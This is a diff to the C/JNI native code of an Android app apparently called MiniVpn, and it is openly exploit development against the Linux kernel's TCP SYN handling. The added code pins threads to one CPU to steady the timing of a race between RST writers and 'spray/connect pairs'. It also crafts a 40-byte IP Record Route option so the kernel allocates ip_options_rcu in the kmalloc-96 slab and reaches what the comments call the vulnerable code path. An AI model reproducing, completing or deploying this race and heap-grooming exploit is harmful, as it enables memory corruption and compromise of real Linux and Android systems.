@@ -1,9 +1,11 @@
+#define _GNU_SOURCE
 #include <jni.h>
 #include <string.h>
 #include <errno.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <arpa/inet.h>
+#include <sched.h>
 #include <sys/socket.h>
 #include <sys/select.h>
 #include <netinet/in.h>
@@ -152,30 +154,49 @@ Java_com_mini_MiniVpn_nativeCompare(JNIEnv *env, jclass clazz, jint fd,
 }
 
 /*
- * Widen the syn_recv_sock() window.
+ * Pin the calling thread to one CPU.
  *
- * tcp_v4_syn_recv_sock() calls inet_csk_route_req() to find a route for the
- * new child. When the SYN carried an LSRR option, that lookup is done against
- * opt->faddr instead of the peer address. If faddr has never been routed
- * before, ip_route_output_slow() walks the FIB instead of hitting the dst
- * cache, which costs tens of microseconds instead of a couple.
+ * With eight cores and three spray/connect pairs all unpinned, the RST writer
+ * and the connector keep preempting each other, which scrambles the RST
+ * cadence -- the one thing the race depends on being steady.
+ */
+JNIEXPORT void JNICALL
+Java_com_mini_MiniVpn_nativePinCpu(JNIEnv *env, jclass clazz, jint cpu)
+{
+    cpu_set_t set;
+
+    (void) env;
+    (void) clazz;
+
+    CPU_ZERO(&set);
+    CPU_SET((int) cpu, &set);
+    sched_setaffinity(0, sizeof(set), &set);
+}
+
+/*
+ * Client side: attach a 40-byte RR option block to the SYN so the listener
+ * allocates a request sock with a non-NULL ireq_opt.
  *
- * That does not make the timing jitter go away, it makes the target fifty
- * times bigger -- which is the only lever that actually helps here.
+ * This is the part that matters. Without IP options, tcp_v4_syn_recv_sock()
+ * takes the "inet_opt is NULL" branch and none of the vulnerable code runs --
+ * every earlier experiment here was silently testing nothing.
  *
- * Client side: build the LSRR option, bind to the tun address, kick off a
- * non-blocking connect. Returns the fd, or -errno.
+ * RR rather than LSRR on purpose: LSRR is dropped by ip_options_compile()
+ * unless accept_source_route is set for the ingress device (it is 0 for
+ * "all"), and it would not have widened anything anyway, because a
+ * local-to-local delivery always resolves through the local table.
+ *
+ * Returns the fd, or -errno.
  */
 JNIEXPORT jint JNICALL
-Java_com_mini_MiniVpn_nativeConnectLsrc(JNIEnv *env, jclass clazz,
-                                        jint sport, jint lsrc, jint dport)
+Java_com_mini_MiniVpn_nativeConnectRr(JNIEnv *env, jclass clazz,
+                                     jint sport, jint dport)
 {
     int fd;
     int r;
     int e;
     struct sockaddr_in sa;
     unsigned char opt[OPT_LEN];
-    int i;
 
     (void) env;
     (void) clazz;
@@ -185,31 +206,19 @@ Java_com_mini_MiniVpn_nativeConnectLsrc(JNIEnv *env, jclass clazz,
         return -errno;
     }
 
-    /*
-     * NOP + LSRR(39). Nine addresses follow the pointer field; the kernel only
-     * routes against the first one (faddr), but a full list keeps the option
-     * block at 40 bytes so the request sock's ireq_opt still lands in
-     * kmalloc-96.
-     */
+    /* NOP + RR(39): optlen 40, so ip_options_rcu lands in kmalloc-96. */
     memset(opt, 0, OPT_LEN);
-    opt[0] = 1;     /* IPOPT_NOP  */
-    opt[1] = 131;   /* IPOPT_LSRR */
-    opt[2] = 39;    /* length     */
-    opt[3] = 4;     /* pointer    */
-    for (i = 0; i < 9; i++) {
-        unsigned int a = (unsigned int) lsrc + (unsigned int) i;
-        opt[4 + i * 4 + 0] = (unsigned char) ((a >> 24) & 0xff);
-        opt[4 + i * 4 + 1] = (unsigned char) ((a >> 16) & 0xff);
-        opt[4 + i * 4 + 2] = (unsigned char) ((a >> 8) & 0xff);
-        opt[4 + i * 4 + 3] = (unsigned char) (a & 0xff);
-    }
+    opt[0] = 1;     /* IPOPT_NOP */
+    opt[1] = 7;     /* IPOPT_RR  */
+    opt[2] = 39;    /* length    */
+    opt[3] = 4;     /* pointer   */
     if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opt, sizeof(opt)) != 0) {
         e = errno;
         close(fd);
         return -e;
     }
 
-    /* Bind to the tun address so the peer sees a local source. */
+    /* Bind to the tun address so the source is local and delivery is local. */
     memset(&sa, 0, sizeof(sa));
     sa.sin_family = AF_INET;
     sa.sin_port = htons((unsigned short) sport);
